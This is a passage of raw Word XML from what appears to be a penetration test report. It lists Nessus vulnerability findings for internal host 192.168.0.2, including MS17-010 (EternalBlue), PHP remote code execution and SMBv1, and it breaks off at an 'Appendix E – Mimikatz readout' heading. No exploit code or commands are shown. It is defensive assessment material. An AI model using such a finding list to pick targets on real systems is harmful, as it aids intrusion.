    <w:p w14:paraId="6E652C02" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 9.3 97833 MS17-010: Security Update for Microsoft Windows SMB Server (4013389) (ETERNALBLUE) (ETERNALCHAMPION) (ETERNALROMANCE) (ETERNALSYNERGY) (WannaCry) (EternalRocks) (Petya) (uncredentialed check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A562BB5" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 9.3 130276 PHP &lt; 7.1.33 / 7.2.x &lt; 7.2.24 / 7.3.x &lt; 7.3.11 Remote Code Execution Vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D796A6" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 8.5 119764 PHP 5.6.x &lt; 5.6.39 Multiple vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67BB1440" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 7.5 101525 PHP 5.6.x &lt; 5.6.31 Multiple Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F04D310" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 7.5 104631 PHP 5.6.x &lt; 5.6.32 Multiple Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4721D14C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 7.5 107216 PHP 5.6.x &lt; 5.6.34 Stack Buffer Overflow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77672B32" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 7.5 121602 PHP 5.6.x &lt; 5.6.40 Multiple vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF10E28" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 6.8 109576 PHP 5.6.x &lt; 5.6.36 Multiple Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B8EB12" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 5.8 90510 MS16-047: Security Update for SAM and LSAD Remote Protocols (3148527) (Badlock) (uncredentialed check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461F09E0" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 5.8 42263 Unencrypted Telnet Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCAA56D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 5.0 11213 HTTP TRACE / TRACK Methods Allowed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C391247" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 5.0 72837 MS12-017: Vulnerability in DNS Server Could Allow Denial of Service (2647170) (uncredentialed check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047EF2CE" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>192.168.0.2 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1535877B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 5.0 111230 PHP 5.6.x &lt; 5.6.37 exif_thumbnail_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>extract(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>) DoS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419B2777" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 4.3 105771 PHP 5.6.x &lt; 5.6.33 Multiple Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7845D964" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 4.3 117497 PHP 5.6.x &lt; 5.6.38 Transfer-Encoding Parameter XSS Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB1D760" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>LOW 2.6 10759 Web Server HTTP Header Internal IP Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A05612" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>LOW 1.9 122591 PHP 5.6.x &lt; 5.6.35 Security Bypass Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39129C00" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10114 ICMP Timestamp Request Remote Date Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F76CF7" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 48204 Apache HTTP Server Version</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441C05B7" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 45590 Common Platform Enumeration (CPE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021409FD" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10736 DCE Services Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CFCD7B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 11002 DNS Server Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200AC5B9" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 72779 DNS Server Version Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5850131C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 54615 Device Type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FA0F43" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>INFO N/A 35716 Ethernet Card Manufacturer Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E283B02" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 86420 Ethernet MAC Addresses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086C8203" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10107 HTTP Server Type and Version</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C46F1A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 12053 Host Fully Qualified Domain Name (FQDN) Resolution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE71343" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 24260 HyperText Transfer Protocol (HTTP) Information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ADAAA84" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 43829 Kerberos Information Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01CC2DC6" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 25701 LDAP Crafted Search Request Server Information Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1104B1AA" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 20870 LDAP Server Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C208B17" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 53513 Link-Local Multicast Name Resolution (LLMNR) Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0784FB61" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 72780 Microsoft DNS Server Version Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13AC5BD5" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 10394 Microsoft Windows SMB Log </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>In</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Possible</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564BB891" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10785 Microsoft Windows SMB NativeLanManager Remote System Information Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F489BD" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>192.168.0.2 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D54E331" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 26917 Microsoft Windows SMB </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Registry :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nessus Cannot Access the Windows Registry</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9C85E0" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 11011 Microsoft Windows SMB Service Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC8A941" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 100871 Microsoft Windows SMB Versions Supported (remote check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C121C60" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 106716 Microsoft Windows SMB2 Dialects Supported (remote check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD748CC" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 11219 Nessus SYN scanner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37107D3F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 19506 Nessus Scan Information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA1AA23" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 24786 Nessus Windows Scan Not Performed with Admin Privileges</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B08C8CB" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10884 Network Time Protocol (NTP) Server Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0C09E8" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 11936 OS Identification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E4F45B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10919 Open Port Re-check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157F1031" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 48243 PHP Version Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469CE611" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 66334 Patch Report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C32F1D8" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 96982 Server Message Block (SMB) Protocol Version 1 Enabled (uncredentialed check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1974B2E1" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 22964 Service Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CFF1930" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 25220 TCP/IP Timestamps Supported</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="517609CC" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10281 Telnet Server Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3862BC43" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>INFO N/A 10287 Traceroute Information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EDD386C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 20094 VMware Virtual Machine Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CA5828" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 20108 Web Server / Application favicon.ico Vendor Fingerprinting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A4D6F7" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10386 Web Server No 404 Error Code Check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D792CE" w14:textId="77777777" w:rsidR="002152BC" w:rsidRPr="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10150 Windows NetBIOS / SMB Remote Host Information Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3727B0D8" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08B8174E" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="00A0250F">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:right="1229"/>
        <w:jc w:val="right"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1962ADBB" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="34" w:name="_Toc27518420"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="00A0250F">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Mimikatz readout</w:t>
      </w:r>
      <w:bookmarkEnd w:id="34"/>
      <w:r>
        <w:rPr>
